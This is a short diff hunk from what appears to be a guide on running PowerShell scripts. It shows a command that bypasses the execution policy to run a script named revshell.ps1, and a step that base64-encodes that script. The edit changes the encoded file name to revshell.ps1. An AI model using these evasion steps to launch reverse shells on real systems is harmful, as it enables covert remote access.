@@ -8,7 +8,7 @@ powershell -ep bypass -NoProfile -File revshell.ps1
 ### 2. Use base64
 Step1: Encode the Script
 ```powershell
-$script = Get-Content -Path "a.ps1" -Raw
+$script = Get-Content -Path "revshell.ps1" -Raw
 $encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
 $encodedScript
 ```
